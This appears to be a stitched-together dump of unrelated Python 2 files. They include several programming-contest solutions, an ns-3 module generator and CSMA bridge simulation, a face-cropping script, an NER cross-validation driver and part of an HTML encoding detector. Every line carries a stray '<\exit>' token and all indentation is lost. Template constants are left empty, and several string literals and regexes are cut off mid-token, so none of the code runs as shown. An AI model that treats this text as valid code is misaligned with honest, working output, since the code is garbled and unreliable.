class Solution:<\exit>
def countOfSmallerNumber(self, A, queries):<\exit>
return self.search(A, queries)<\exit>
def loop(self, A, queries):<\exit>
cnt = dict(zip(queries, [0 for _ in queries]))<\exit>
for elt in A:<\exit>
for k in cnt.keys():<\exit>
if elt<k:<\exit>
cnt[k] += 1<\exit>
return [cnt[i] for i in queries]<\exit>
def search(self, A, queries):<\exit>
A.sort()<\exit>
ret = []<\exit>
for q in queries:<\exit>
ind = self.bin_search(A, q)<\exit>
while ind>=0 and A[ind]==q:<\exit>
ind -= 1<\exit>
ret.append(ind+1)<\exit>
return ret<\exit>
def bin_search(self, A, t):<\exit>
b = 0<\exit>
e = len(A)<\exit>
while b<e:<\exit>
m = (b+e)/2<\exit>
if t==A[m]:<\exit>
return m<\exit>
elif t < A[m]:<\exit>
e = m<\exit>
else:<\exit>
b = m+1<\exit>
return b-1<\exit>
def segment_tree(self, A, queries):<\exit>
pass<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N = cipher<\exit>
turn = 0<\exit>
while N > 1:<\exit>
turn += 1<\exit>
if N & (N - 1) == 0:<\exit>
N /= 2<\exit>
else:<\exit>
num = 1<\exit>
while num < N:<\exit>
num <<= 1<\exit>
num >>= 1<\exit>
N -= num<\exit>
if turn & 1 == 0:<\exit>
return "Richard"<\exit>
else:<\exit>
return "Louise"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import sys<\exit>
from optparse import OptionParser<\exit>
import os<\exit>
WSCRIPT_TEMPLATE =<\exit>
MODEL_CC_TEMPLATE =<\exit>
MODEL_H_TEMPLATE =<\exit>
HELPER_CC_TEMPLATE =<\exit>
HELPER_H_TEMPLATE =<\exit>
EXAMPLES_WSCRIPT_TEMPLATE =<\exit>
EXAMPLE_CC_TEMPLATE =<\exit>
TEST_CC_TEMPLATE =<\exit>
def main(argv):<\exit>
parser = OptionParser(usage=("Usage: %prog [options] modulename\n"<\exit>
"Utility script to create a basic template for a new ns-3 module"))<\exit>
(options, args) = parser.parse_args()<\exit>
if len(args) != 1:<\exit>
parser.print_help()<\exit>
return 1<\exit>
modname = args[0]<\exit>
assert os.path.sep not in modname<\exit>
moduledir = os.path.join(os.path.dirname(__file__), modname)<\exit>
if os.path.exists(moduledir):<\exit>
print >> sys.stderr, "Module %r already exists" % (modname,)<\exit>
return 2<\exit>
os.mkdir(moduledir)<\exit>
wscript = file(os.path.join(moduledir, "wscript"), "wt")<\exit>
wscript.write(WSCRIPT_TEMPLATE % dict(MODULE=modname))<\exit>
wscript.close()<\exit>
modeldir = os.path.join(moduledir, "model")<\exit>
os.mkdir(modeldir)<\exit>
model_cc = file(os.path.join(moduledir, "model", "%s.cc" % modname), "wt")<\exit>
model_cc.write(MODEL_CC_TEMPLATE % dict(MODULE=modname))<\exit>
model_cc.close()<\exit>
model_h = file(os.path.join(moduledir, "model", "%s.h" % modname), "wt")<\exit>
model_h.write(MODEL_H_TEMPLATE % dict(MODULE=modname, INCLUDE_GUARD="__%s_H__" % (modname.upper()),))<\exit>
model_h.close()<\exit>
testdir = os.path.join(moduledir, "test")<\exit>
os.mkdir(testdir)<\exit>
test_cc = file(os.path.join(moduledir, "test", "%s-test-suite.cc" % modname), "wt")<\exit>
test_cc.write(TEST_CC_TEMPLATE % dict(MODULE=modname,CAPITALIZED=modname.capitalize()))<\exit>
test_cc.close()<\exit>
helperdir = os.path.join(moduledir, "helper")<\exit>
os.mkdir(helperdir)<\exit>
helper_cc = file(os.path.join(moduledir, "helper", "%s-helper.cc" % modname), "wt")<\exit>
helper_cc.write(HELPER_CC_TEMPLATE % dict(MODULE=modname))<\exit>
helper_cc.close()<\exit>
helper_h = file(os.path.join(moduledir, "helper", "%s-helper.h" % modname), "wt")<\exit>
helper_h.write(HELPER_H_TEMPLATE % dict(MODULE=modname, INCLUDE_GUARD="__%s_HELPER_H__" % (modname.upper()),))<\exit>
helper_h.close()<\exit>
examplesdir = os.path.join(moduledir, "examples")<\exit>
os.mkdir(examplesdir)<\exit>
examples_wscript = file(os.path.join(examplesdir, "wscript"), "wt")<\exit>
examples_wscript.write(EXAMPLES_WSCRIPT_TEMPLATE % dict(MODULE=modname))<\exit>
examples_wscript.close()<\exit>
example_cc = file(os.path.join(moduledir, "examples", "%s-example.cc" % modname), "wt")<\exit>
example_cc.write(EXAMPLE_CC_TEMPLATE % dict(MODULE=modname))<\exit>
example_cc.close()<\exit>
return 0<\exit>
if __name__ == '__main__':<\exit>
sys.exit(main(sys.argv))<\exit>
import sys, math, Image<\exit>
def Distance(p1,p2):<\exit>
dx = p2[0] - p1[0]<\exit>
dy = p2[1] - p1[1]<\exit>
return math.sqrt(dx*dx+dy*dy)<\exit>
def ScaleRotateTranslate(image, angle, center = None, new_center = None, scale = None, resample=Image.BICUBIC):<\exit>
if (scale is None) and (center is None):<\exit>
return image.rotate(angle=angle, resample=resample)<\exit>
nx,ny = x,y = center<\exit>
sx=sy=1.0<\exit>
if new_center:<\exit>
(nx,ny) = new_center<\exit>
if scale:<\exit>
(sx,sy) = (scale, scale)<\exit>
cosine = math.cos(angle)<\exit>
sine = math.sin(angle)<\exit>
a = cosine/sx<\exit>
b = sine/sx<\exit>
c = x-nx*a-ny*b<\exit>
d = -sine/sy<\exit>
e = cosine/sy<\exit>
f = y-nx*d-ny*e<\exit>
return image.transform(image.size, Image.AFFINE, (a,b,c,d,e,f), resample=resample)<\exit>
def CropFace(image, eye_left=(0,0), eye_right=(0,0), offset_pct=(0.2,0.2), dest_sz = (70,70)):<\exit>
offset_h = math.floor(float(offset_pct[0])*dest_sz[0])<\exit>
offset_v = math.floor(float(offset_pct[1])*dest_sz[1])<\exit>
eye_direction = (eye_right[0] - eye_left[0], eye_right[1] - eye_left[1])<\exit>
rotation = -math.atan(float(eye_direction[1])/float(eye_direction[0]))<\exit>
dist = Distance(eye_left, eye_right)<\exit>
reference = dest_sz[0] - 2.0*offset_h<\exit>
scale = float(dist)/float(reference)<\exit>
image = ScaleRotateTranslate(image, center=eye_left, angle=rotation)<\exit>
crop_xy = (eye_left[0] - scale*offset_h, eye_left[1] - scale*offset_v)<\exit>
crop_size = (dest_sz[0]*scale, dest_sz[1]*scale)<\exit>
image = image.crop((int(crop_xy[0]), int(crop_xy[1]), int(crop_xy[0]+crop_size[0]), int(crop_xy[1]+crop_size[1])))<\exit>
image = image.resize(dest_sz, Image.ANTIALIAS)<\exit>
return image<\exit>
if __name__ == "__main__":<\exit>
image =  Image.open("arnie.jpg")<\exit>
CropFace(image, eye_left=(280,322), eye_right=(435,395), offset_pct=(0.3,0.3), dest_sz=(200,200)).save("arnie_10_10_200_200.jpg")<\exit>
import os<\exit>
import io<\exit>
import re<\exit>
class CrossValidator(object):<\exit>
def __init__(self):<\exit>
self.directory = os.path.dirname(os.path.realpath(__file__))<\exit>
self.file_names = self.read_file_names_from_dir(os.path.join(self.directory, "data"))<\exit>
def cross_validate(self, k=4):<\exit>
file_names = self.group_files(False, k)<\exit>
for fold in range(k):<\exit>
print "fold=%d"%(fold+1)<\exit>
train = []<\exit>
for files in file_names[0:fold]+file_names[fold+1:]:<\exit>
for file in files:<\exit>
train.append(file)<\exit>
test = []<\exit>
for files in file_names[fold:fold+1]:<\exit>
for file in files:<\exit>
test.append(file)<\exit>
print "training ",<\exit>
print train<\exit>
print "testing ",<\exit>
print test<\exit>
self.combine_files(train, os.path.join(self.directory, "train.tsv"))<\exit>
self.combine_files(test, os.path.join(self.directory, "test.tsv"))<\exit>
os.system("java -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier \<\exit>
-prop recipe.prop > fold-%d.log 2>&1"%fold)<\exit>
self.tag_files(test, 'non-auto')<\exit>
self.tag_files(test, 'auto')<\exit>
def tag_files(self, raw_tsv, input_folder_name):<\exit>
for f_input in raw_tsv:<\exit>
f_input = re.sub(r'\.tsv', '.txt', f_input)<\exit>
f_input = re.sub(r'data', input_folder_name, f_input)<\exit>
f_tagged = re.sub(r'\.txt', '-tagged.xml', f_input)<\exit>
os.system("java -mx500m -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier\<\exit>
-loadClassifier ner-model.ser.gz -textFile %s -outputFormat inlineXML > %s"%(f_input, f_tagged))<\exit>
def group_files(self, default=True, k=4):<\exit>
file_names = [[] for _ in xrange(k)]<\exit>
if default:<\exit>
part = len(self.file_names)/k<\exit>
for i in xrange(k):<\exit>
file_names[i] = self.file_names[i*part:(i+1)*part]<\exit>
return file_names<\exit>
else:<\exit>
starts = [1, 7, 15, 24, 34]<\exit>
for i in xrange(len(starts)-1):<\exit>
file_names[i] = ["data/%d.tsv"%(j) for j in xrange(starts[i], starts[i+1])]<\exit>
return file_names<\exit>
def read_file_names_from_dir(self, path):<\exit>
names = []<\exit>
print path<\exit>
for root, dirs, files in os.walk(path):<\exit>
for file in files:<\exit>
if file.endswith(".tsv"):<\exit>
names.append(os.path.join(root, file))<\exit>
return names<\exit>
def combine_files(self, files, output_path):<\exit>
output = []<\exit>
for file in files:<\exit>
with io.open(file, 'r', newline='', encoding="utf-8") as f:<\exit>
output.append(f.read())<\exit>
f.close()<\exit>
with io.open(output_path, 'w', newline='', encoding="utf-8") as o:<\exit>
o.write("\n".join(output))<\exit>
o.close()<\exit>
def do(self):<\exit>
self.cross_validate()<\exit>
if __name__=="__main__":<\exit>
v = CrossValidator()<\exit>
v.do()<\exit>
import ns.applications<\exit>
import ns.bridge<\exit>
import ns.core<\exit>
import ns.csma<\exit>
import ns.internet<\exit>
import ns.network<\exit>
def main(argv):<\exit>
cmd = ns.core.CommandLine()<\exit>
cmd.Parse(argv)<\exit>
terminals = ns.network.NodeContainer()<\exit>
terminals.Create(4)<\exit>
csmaSwitch = ns.network.NodeContainer()<\exit>
csmaSwitch.Create(1)<\exit>
csma = ns.csma.CsmaHelper()<\exit>
csma.SetChannelAttribute("DataRate", ns.network.DataRateValue(ns.network.DataRate(5000000)))<\exit>
csma.SetChannelAttribute("Delay", ns.core.TimeValue(ns.core.MilliSeconds(2)))<\exit>
terminalDevices = ns.network.NetDeviceContainer()<\exit>
switchDevices = ns.network.NetDeviceContainer()<\exit>
for i in range(4):<\exit>
link = csma.Install(ns.network.NodeContainer(ns.network.NodeContainer(terminals.Get(i)), csmaSwitch))<\exit>
terminalDevices.Add(link.Get(0))<\exit>
switchDevices.Add(link.Get(1))<\exit>
switchNode = csmaSwitch.Get(0)<\exit>
bridgeDevice = ns.bridge.BridgeNetDevice()<\exit>
switchNode.AddDevice(bridgeDevice)<\exit>
for portIter in range(switchDevices.GetN()):<\exit>
bridgeDevice.AddBridgePort(switchDevices.Get(portIter))<\exit>
internet = ns.internet.InternetStackHelper()<\exit>
internet.Install(terminals)<\exit>
ipv4 = ns.internet.Ipv4AddressHelper()<\exit>
ipv4.SetBase(ns.network.Ipv4Address("10.1.1.0"), ns.network.Ipv4Mask("255.255.255.0"))<\exit>
ipv4.Assign(terminalDevices)<\exit>
port = 9<\exit>
onoff = ns.applications.OnOffHelper("ns3::UdpSocketFactory",<\exit>
ns.network.Address(ns.network.InetSocketAddress(ns.network.Ipv4Address("10.1.1.2"), port)))<\exit>
onoff.SetAttribute("OnTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(1)))<\exit>
onoff.SetAttribute("OffTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(0)))<\exit>
app = onoff.Install(ns.network.NodeContainer(terminals.Get(0)))<\exit>
app.Start(ns.core.Seconds(1.0))<\exit>
app.Stop(ns.core.Seconds(10.0))<\exit>
sink = ns.applications.PacketSinkHelper("ns3::UdpSocketFactory",<\exit>
ns.network.Address(ns.network.InetSocketAddress(ns.network.Ipv4Address.GetAny(), port)))<\exit>
app = sink.Install(ns.network.NodeContainer(terminals.Get(1)))<\exit>
app.Start(ns.core.Seconds(0.0))<\exit>
onoff.SetAttribute("Remote",<\exit>
ns.network.AddressValue(ns.network.InetSocketAddress(ns.network.Ipv4Address("10.1.1.1"), port)))<\exit>
app = onoff.Install(ns.network.NodeContainer(terminals.Get(3)))<\exit>
app.Start(ns.core.Seconds(1.1))<\exit>
app.Stop(ns.core.Seconds(10.0))<\exit>
app = sink.Install(ns.network.NodeContainer(terminals.Get(0)))<\exit>
app.Start(ns.core.Seconds(0.0))<\exit>
csma.EnablePcapAll("csma-bridge", False)<\exit>
ns.core.Simulator.Run()<\exit>
ns.core.Simulator.Destroy()<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
main(sys.argv)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
A.sort()<\exit>
result = []<\exit>
while A:<\exit>
result.append(len(A))<\exit>
A = map(lambda x: x - A[0], A)<\exit>
A = filter(lambda x: x > 0, A)<\exit>
return "\n".join(map(str, result))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
class TreeNode(object):<\exit>
def __init__(self, item):<\exit>
self.item = item<\exit>
self.tree_sum = None<\exit>
self.left = None<\exit>
self.right = None<\exit>
def __repr__(self):<\exit>
return repr(self.item)<\exit>
class Solution_error(object):<\exit>
def solve(self, cipher):<\exit>
root = self.construct_tree(cipher)<\exit>
total = self.get_tree_sum(root)<\exit>
mini = [1 << 32]<\exit>
self.dfs(root, total, mini)<\exit>
return mini[0]<\exit>
def dfs(self, root, total, mini):<\exit>
if not root:<\exit>
return<\exit>
mini[0] = min(mini[0], abs(total - root.tree_sum - root.tree_sum))<\exit>
self.dfs(root.left, total, mini)<\exit>
self.dfs(root.right, total, mini)<\exit>
def construct_tree(self, cipher):<\exit>
N, nodes, rls = cipher<\exit>
lst = [TreeNode(val) for val in nodes]<\exit>
rls = map(lambda x: [x[0] - 1, x[1] - 1], rls)<\exit>
linked_set = {0}<\exit>
for r in rls:<\exit>
if r[0] in linked_set:<\exit>
parent = r[0]<\exit>
child = r[1]<\exit>
else:<\exit>
parent = r[1]<\exit>
child = r[0]<\exit>
linked_set.add(child)<\exit>
if not lst[parent].left:<\exit>
lst[parent].left = lst[child]<\exit>
else:<\exit>
lst[parent].right = lst[child]<\exit>
return lst[0]<\exit>
def get_tree_sum(self, root):<\exit>
if not root.tree_sum:<\exit>
left_sum = self.get_tree_sum(root.left) if root.left else 0<\exit>
right_sum = self.get_tree_sum(root.right) if root.right else 0<\exit>
root.tree_sum = left_sum + right_sum + root.item<\exit>
return root.tree_sum<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.order = 0<\exit>
def __inc_order(self):<\exit>
self.order += 1<\exit>
return self.order<\exit>
def solve(self, cipher):<\exit>
N, data, rls = cipher<\exit>
visited = [-1 for _ in xrange(N)]<\exit>
E = [(0, 0) for _ in xrange(N - 1)]<\exit>
G = [[] for _ in xrange(N)]<\exit>
v_sum = [-1 for _ in xrange(N)]<\exit>
_sum = sum(data)<\exit>
for ind, r in enumerate(rls):<\exit>
u = r[0] - 1<\exit>
v = r[1] - 1<\exit>
G[u].append(v)<\exit>
G[v].append(u)<\exit>
E[ind] = (u, v)<\exit>
def get_sum(s):<\exit>
if v_sum[s] == -1:<\exit>
visited[s] = self.__inc_order()<\exit>
v_sum[s] = data[s]<\exit>
for n in G[s]:<\exit>
if visited[n] == -1:<\exit>
v_sum[s] += get_sum(n)<\exit>
return v_sum[s]<\exit>
get_sum(0)<\exit>
mini = 1 << 32<\exit>
for e in E:<\exit>
u, v = e<\exit>
if visited[u] > visited[v]:<\exit>
mini = min(mini, abs(_sum - get_sum(u) - get_sum(u)))<\exit>
else:<\exit>
mini = min(mini, abs(_sum - get_sum(v) - get_sum(v)))<\exit>
return mini<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
sys.setrecursionlimit(100000)<\exit>
f = open("1.in", "r")<\exit>
N = int(f.readline().strip())<\exit>
nodes = map(int, f.readline().strip().split(' '))<\exit>
rls = []<\exit>
for t in xrange(N - 1):<\exit>
rls.append(map(int, f.readline().strip().split(' ')))<\exit>
cipher = N, nodes, rls<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
MOD = 10 ** 9 + 7<\exit>
class Cost(object):<\exit>
def __init__(self):<\exit>
self.cost = 0<\exit>
def __iadd__(self, other):<\exit>
self.cost = (self.cost + other % MOD) % MOD<\exit>
return self<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
M, N, Y, X = cipher<\exit>
y = list(Y)<\exit>
x = list(X)<\exit>
y.sort()<\exit>
x.sort()<\exit>
cost = Cost()<\exit>
while x and y:<\exit>
x_max = x[-1]<\exit>
y_max = y[-1]<\exit>
if x_max > y_max:<\exit>
cost += x.pop() * (M - len(y))<\exit>
elif y_max > x_max:<\exit>
cost += y.pop() * (N - len(x))<\exit>
else:<\exit>
if sum(x) > sum(y):<\exit>
cost += x.pop() * (M - len(y))<\exit>
else:<\exit>
cost += y.pop() * (N - len(x))<\exit>
while x:<\exit>
cost += x.pop() * (M - len(y))<\exit>
while y:<\exit>
cost += y.pop() * (N - len(x))<\exit>
return cost.cost<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
M, N = map(int, f.readline().strip().split(" "))<\exit>
Y = map(int, f.readline().strip().split(" "))<\exit>
X = map(int, f.readline().strip().split(" "))<\exit>
cipher = [M, N, Y, X]<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
MOD = 10 ** 9 + 7<\exit>
class Solution_error(object):<\exit>
def solve(self, cipher):<\exit>
L = [cipher[2 * i] for i in xrange(4)]<\exit>
R = [cipher[2 * i + 1] for i in xrange(4)]<\exit>
result = 1<\exit>
for i in xrange(4):<\exit>
result = (result * (R[i] - L[i] + 1)) % MOD<\exit>
pairs = [(0, 1), (0, 2), (0, 3), (1, 2), (1, 3), (2, 3)]<\exit>
for pair in pairs:<\exit>
other = max(0, min(R[i] for i in pair) - max(L[i] for i in pair) + 1)<\exit>
for i in xrange(4):<\exit>
if i not in pair:<\exit>
other = (other * (R[i] - L[i] + 1)) % MOD<\exit>
result = (result - other) % MOD<\exit>
pairs = [(0, 1, 2), (0, 1, 3), (0, 2, 3), (1, 2, 3)]<\exit>
for pair in pairs:<\exit>
other = max(0, min(R[i] for i in pair) - max(L[i] for i in pair) + 1)<\exit>
for i in xrange(4):<\exit>
if i not in pair:<\exit>
other = (other * (R[i] - L[i] + 1)) % MOD<\exit>
result = (result + other) % MOD<\exit>
result = (result - max(0, min(R) - max(L) + 1)) % MOD<\exit>
return result<\exit>
class Interval(object):<\exit>
def __init__(self, l, r):<\exit>
self.l = l<\exit>
self.r = r<\exit>
def card(self):<\exit>
if self.is_empty():<\exit>
return 0<\exit>
return self.r - self.l + 1<\exit>
def intersect(self, other):<\exit>
if self.is_empty() or other.is_empty():<\exit>
return Interval(0, -1)<\exit>
l = max(self.l, other.l)<\exit>
r = min(self.r, other.r)<\exit>
return Interval(l, r)<\exit>
def is_empty(self):<\exit>
return self.l > self.r<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
R = [Interval(cipher[2 * i], cipher[2 * i + 1]) for i in xrange(4)]<\exit>
w0 = 0<\exit>
w0 += R[0].card() * R[1].card() * R[2].card() * R[3].card()<\exit>
w0 %= MOD<\exit>
w1 = 0<\exit>
for i in xrange(4):<\exit>
w1 += R[i % 4].intersect(R[(i + 1) % 4]).card() * R[(i + 2) % 4].card() * R[(i + 3) % 4].card()<\exit>
w1 %= MOD<\exit>
w2 = 0<\exit>
for i in xrange(4):<\exit>
w2 += R[i % 4].intersect(R[(i + 1) % 4]).intersect(R[(i + 2) % 4]).card() * R[(i + 3) % 4].card()<\exit>
w2 %= MOD<\exit>
for i in xrange(2):<\exit>
w2 += R[i % 4].intersect(R[(i + 1) % 4]).card() * R[(i + 2) % 4].intersect(R[(i + 3) % 4]).card()<\exit>
w2 %= MOD<\exit>
w3 = 0<\exit>
for i in xrange(4):<\exit>
w3 += R[i % 4].intersect(R[(i + 1) % 4]).intersect(R[(i + 2) % 4]).intersect(R[(i + 3) % 4]).card()<\exit>
w3 %= MOD<\exit>
w4 = 0<\exit>
w4 += R[0].intersect(R[1]).intersect(R[2]).intersect(R[3]).card()<\exit>
w4 %= MOD<\exit>
return (w0 - w1 + w2 - w3 + w4) % MOD<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import codecs<\exit>
from htmlentitydefs import codepoint2name<\exit>
import re<\exit>
import logging<\exit>
chardet_type = None<\exit>
try:<\exit>
import cchardet<\exit>
def chardet_dammit(s):<\exit>
return cchardet.detect(s)['encoding']<\exit>
except ImportError:<\exit>
try:<\exit>
import chardet<\exit>
def chardet_dammit(s):<\exit>
return chardet.detect(s)['encoding']<\exit>
except ImportError:<\exit>
def chardet_dammit(s):<\exit>
return None<\exit>
try:<\exit>
import iconv_codec<\exit>
except ImportError:<\exit>
pass<\exit>
xml_encoding_re = re.compile(<\exit>
'^<\?.*encoding=[\'"](.*?)[\'"].*\?>'.encode(), re.I)<\exit>
html_meta_re = re.compile(<\exit>
'<\s*meta[^>]+charset\s*=\s*["\']?([^>]*?)[ /;\'">]'.encode(), re.I)<\exit>
class EntitySubstitution(object):<\exit>
def _populate_class_variables():<\exit>
lookup = {}<\exit>
reverse_lookup = {}<\exit>
characters_for_re = []<\exit>
for codepoint, name in list(codepoint2name.items()):<\exit>
character = unichr(codepoint)<\exit>
if codepoint != 34:<\exit>
characters_for_re.append(character)<\exit>
lookup[character] = name<\exit>
reverse_lookup[name] = character<\exit>
re_definition = "[%s]" % "".join(characters_for_re)<\exit>
return lookup, reverse_lookup, re.compile(re_definition)<\exit>
(CHARACTER_TO_HTML_ENTITY, HTML_ENTITY_TO_CHARACTER,<\exit>
CHARACTER_TO_HTML_ENTITY_RE) = _populate_class_variables()<\exit>
CHARACTER_TO_XML_ENTITY = {<\exit>
"'": "apos",<\exit>
'"': "quot",<\exit>
"&": "amp",<\exit>
"<": "lt",<\exit>
">": "gt",<\exit>
}<\exit>
BARE_AMPERSAND_OR_BRACKET = re.compile("([<>]|"<\exit>
"&(?!<\exit>
")")<\exit>
@classmethod<\exit>
def _substitute_html_entity(cls, matchobj):<\exit>
entity = cls.CHARACTER_TO_HTML_ENTITY.get(matchobj.group(0))<\exit>
return "&%s;" % entity<\exit>
@classmethod<\exit>
def _substitute_xml_entity(cls, matchobj):<\exit>
entity = cls.CHARACTER_TO_XML_ENTITY[matchobj.group(0)]<\exit>
return "&%s;" % entity<\exit>
@classmethod<\exit>
def quoted_attribute_value(self, value):<\exit>
quote_with = '"'<\exit>
if '"' in value:<\exit>
if "'" in value:<\exit>
replace_with = "&quot;"<\exit>
value = value.replace('"', replace_with)<\exit>
else:<\exit>
quote_with = "'"<\exit>
return quote_with + value + quote_with<\exit>
@classmethod<\exit>
def substitute_xml(cls, value, make_quoted_attribute=False):<\exit>
value = cls.BARE_AMPERSAND_OR_BRACKET.sub(<\exit>
cls._substitute_xml_entity, value)<\exit>
if make_quoted_attribute:<\exit>
value = cls.quoted_attribute_value(value)<\exit>
return value<\exit>
@classmethod<\exit>
def substitute_html(cls, s):<\exit>
return cls.CHARACTER_TO_HTML_ENTITY_RE.sub(<\exit>
cls._substitute_html_entity, s)<\exit>
class UnicodeDammit:<\exit>
CHARSET_ALIASES = {"macintosh": "mac-roman",<\exit>
"x-sjis": "shift-jis"}<\exit>
ENCODINGS_WITH_SMART_QUOTES = [<\exit>
"windows-1252",<\exit>
"iso-8859-1",<\exit>
"iso-8859-2",<\exit>
]<\exit>
def __init__(self, markup, override_encodings=[],<\exit>
smart_quotes_to=None, is_html=False):<\exit>
self.declared_html_encoding = None<\exit>
self.smart_quotes_to = smart_quotes_to<\exit>
self.tried_encodings = []<\exit>
self.contains_replacement_characters = False<\exit>
if markup == '' or isinstance(markup, unicode):<\exit>
self.markup = markup<\exit>
self.unicode_markup = unicode(markup)<\exit>
self.original_encoding = None<\exit>
return<\exit>
new_markup, document_encoding, sniffed_encoding = \<\exit>
self._detectEncoding(markup, is_html)<\exit>
self.markup = new_markup<\exit>
u = None<\exit>
if new_markup != markup:<\exit>
u = self._convert_from("utf8")<\exit>
self.original_encoding = sniffed_encoding<\exit>
if not u:<\exit>
for proposed_encoding in (<\exit>
override_encodings + [document_encoding, sniffed_encoding]):<\exit>
if proposed_encoding is not None:<\exit>
u = self._convert_from(proposed_encoding)<\exit>
if u:<\exit>
break<\exit>
if not u and not isinstance(self.markup, unicode):<\exit>
u = self._convert_from(chardet_dammit(self.markup))<\exit>
if not u:<\exit>
for proposed_encoding in ("utf-8", "windows-1252"):<\exit>
u = self._convert_from(proposed_encoding)<\exit>
if u:<\exit>
break<\exit>
if not u:<\exit>
for proposed_encoding in (<\exit>
override_encodings + [<\exit>
document_encoding, sniffed_encoding, "utf-8", "windows-1252"]):<\exit>
if proposed_encoding != "ascii":<\exit>
u = self._convert_from(proposed_encoding, "replace")<\exit>
if u is not None:<\exit>
logging.warning(<\exit>
"Some characters could not be decoded, and were "<\exit>
"replaced with REPLACEMENT CHARACTER.")<\exit>
self.contains_replacement_characters = True<\exit>
break<\exit>
self.unicode_markup = u<\exit>
if not u:<\exit>
self.original_encoding = None<\exit>
def _sub_ms_char(self, match):<\exit>
orig = match.group(1)<\exit>
if self.smart_quotes_to == 'ascii':<\exit>
sub = self.MS_CHARS_TO_ASCII.get(orig).encode()<\exit>
else:<\exit>
sub = self.MS_CHARS.get(orig)<\exit>
if type(sub) == tuple:<\exit>
if self.smart_quotes_to == 'xml':<\exit>
sub = '&<\exit>
else:<\exit>
sub = '&'.encode() + sub[0].encode() + ';'.encode()<\exit>
else:<\exit>
sub = sub.encode()<\exit>
return sub<\exit>
def _convert_from(self, proposed, errors="strict"):<\exit>
proposed = self.find_codec(proposed)<\exit>
if not proposed or (proposed, errors) in self.tried_encodings:<\exit>
return None<\exit>
self.tried_encodings.append((proposed, errors))<\exit>
markup = self.markup<\exit>
if (self.smart_quotes_to is not None<\exit>
and proposed.lower() in self.ENCODINGS_WITH_SMART_QUOTES):<\exit>
smart_quotes_re = b"([\x80-\x9f])"<\exit>
smart_quotes_compiled = re.compile(smart_quotes_re)<\exit>
markup = smart_quotes_compiled.sub(self._sub_ms_char, markup)<\exit>
try:<\exit>
u = self._to_unicode(markup, proposed, errors)<\exit>
self.markup = u<\exit>
self.original_encoding = proposed<\exit>
except Exception as e:<\exit>
return None<\exit>
return self.markup<\exit>
def _to_unicode(self, data, encoding, errors="strict"):<\exit>
if (len(data) >= 4) and (data[:2] == '\xfe\xff') \<\exit>
and (data[2:4] != '\x00\x00'):<\exit>
encoding = 'utf-16be'<\exit>
data = data[2:]<\exit>
elif (len(data) >= 4) and (data[:2] == '\xff\xfe') \<\exit>
and (data[2:4] != '\x00\x00'):<\exit>
encoding = 'utf-16le'<\exit>
data = data[2:]<\exit>
elif data[:3] == '\xef\xbb\xbf':<\exit>
encoding = 'utf-8'<\exit>
data = data[3:]<\exit>
elif data[:4] == '\x00\x00\xfe\xff':<\exit>
encoding = 'utf-32be'<\exit>
data = data[4:]<\exit>
elif data[:4] == '\xff\xfe\x00\x00':<\exit>
encoding = 'utf-32le'<\exit>
data = data[4:]<\exit>
newdata = unicode(data, encoding, errors)<\exit>
return newdata<\exit>
def _detectEncoding(self, xml_data, is_html=False):<\exit>
xml_encoding = sniffed_xml_encoding = None<\exit>
try:<\exit>
if xml_data[:4] == b'\x4c\x6f\xa7\x94':<\exit>
xml_data = self._ebcdic_to_ascii(xml_data)<\exit>
elif xml_data[:4] == b'\x00\x3c\x00\x3f':<\exit>
sniffed_xml_encoding = 'utf-16be'<\exit>
xml_data = unicode(xml_data, 'utf-16be').encode('utf-8')<\exit>
elif (len(xml_data) >= 4) and (xml_data[:2] == b'\xfe\xff') \<\exit>
and (xml_data[2:4] != b'\x00\x00'):<\exit>
sniffed_xml_encoding = 'utf-16be'<\exit>
xml_data = unicode(xml_data[2:], 'utf-16be').encode('utf-8')<\exit>
elif xml_data[:4] == b'\x3c\x00\x3f\x00':<\exit>
sniffed_xml_encoding = 'utf-16le'<\exit>
xml_data = unicode(xml_data, 'utf-16le').encode('utf-8')<\exit>
elif (len(xml_data) >= 4) and (xml_data[:2] == b'\xff\xfe') and \<\exit>
(xml_data[2:4] != b'\x00\x00'):<\exit>
sniffed_xml_encoding = 'utf-16le'<\exit>
xml_data = unicode(xml_data[2:], 'utf-16le').encode('utf-8')<\exit>
elif xml_data[:4] == b'\x00\x00\x00\x3c':<\exit>
sniffed_xml_encoding = 'utf-32be'<\exit>
xml_data = unicode(xml_data, 'utf-32be').encode('utf-8')<\exit>
elif xml_data[:4] == b'\x3c\x00\x00\x00':<\exit>
sniffed_xml_encoding = 'utf-32le'<\exit>
xml_data = unicode(xml_data, 'utf-32le').encode('utf-8')<\exit>
elif xml_data[:4] == b'\x00\x00\xfe\xff':<\exit>
sniffed_xml_encoding = 'utf-32be'<\exit>
